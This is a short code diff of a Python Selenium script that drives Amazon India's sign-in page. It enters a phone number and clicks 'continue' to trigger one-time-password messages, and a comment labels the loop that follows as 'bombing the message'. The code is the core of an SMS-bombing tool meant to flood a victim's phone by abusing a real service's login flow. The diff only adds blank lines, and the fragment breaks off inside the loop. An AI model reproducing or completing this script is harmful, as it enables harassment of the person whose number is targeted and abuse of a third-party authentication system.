@@ -19,10 +19,12 @@ browser.get("https://www.amazon.in/ap/signin?openid.pape.max_auth_age=0&openid.r
 
 email = browser.find_element_by_id("ap_email")
 email.send_keys(phNo)
+
 cont = browser.find_element_by_id("continue")
 cont.click()
 cont = browser.find_element_by_id("continue")
 cont.click()
+
 # bombing the message
 n = 10
 for i in range(n):
